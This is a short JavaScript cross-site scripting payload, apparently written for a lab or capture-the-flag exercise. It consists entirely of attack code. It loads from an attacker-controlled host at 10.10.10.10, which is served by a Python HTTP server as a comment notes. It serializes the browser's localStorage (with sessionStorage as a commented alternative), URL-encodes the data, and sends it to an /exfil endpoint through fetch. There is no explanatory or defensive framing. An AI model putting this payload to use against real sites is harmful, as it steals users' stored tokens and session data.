{/* <script src="http://10.10.10.10/xss.js">
</script> */}
// python3 -m http.server 80

// Stringify the data from localStorage
let data = JSON.stringify(localStorage);

// Stringify the data from sessionStorage
// let data = JSON.stringify(sessionStorage);

// Encode the data to make it URL-safe
let encodedData = encodeURIComponent(data);

// Make a fetch request to a specific URL with the encoded data
fetch("http://10.10.10.10/exfil?data=" + encodedData);
